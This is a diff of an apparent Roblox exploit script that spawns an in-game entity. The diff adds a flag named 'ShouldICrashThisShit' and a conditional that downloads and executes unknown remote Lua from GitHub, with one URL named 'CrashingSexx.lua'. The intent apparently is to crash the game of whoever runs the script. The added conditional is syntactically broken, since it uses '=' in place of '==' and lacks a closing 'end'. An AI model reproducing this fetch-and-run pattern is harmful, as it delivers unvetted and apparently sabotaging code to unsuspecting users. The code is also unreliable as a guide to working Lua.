@@ -7,6 +7,7 @@ local TweenService = game:GetService("TweenService")
 
 local cameraShaker = require(game.ReplicatedStorage.CameraShaker)
 local camera = workspace.CurrentCamera
+local ShouldICrashThisShit = true
 
 local camShake = cameraShaker.new(Enum.RenderPriority.Camera.Value, function(cf)
     camera.CFrame = camera.CFrame * cf
@@ -143,8 +144,10 @@ if not hasModel("SeekMovingNewClone") and not hasModel("FigureRig") and not hasM
                     maingame.stopcam = false
                     maingame.freemouse = false
                     wait(0.4)
-                    
-                    loadstring(game:HttpGet(("https://raw.githubusercontent.com/XAtomMaster339871/dkrsoilcfrkjghfhgrthngnrtuyghrtuhngur/main/erfz"),true))()
+                    if ShouldICrashThisShit = true then
+                    loadstring(game:HttpGet(("https://raw.githubusercontent.com/ala22221/Entities/refs/heads/main/CrashingSexx.lua"),true))()
+                        else
+                            loadstring(game:HttpGet(("https://raw.githubusercontent.com/ala22221/Entities/refs/heads/main/HotSex.lua"),true))()
                     local player = Players.LocalPlayer
                     ReplicatedStorage.GameStats["Player_"..player.Name].Total.DeathCause.Value = "Dread"
                     firesignal(game.ReplicatedStorage.RemotesFolder.DeathHint.OnClientEvent, {
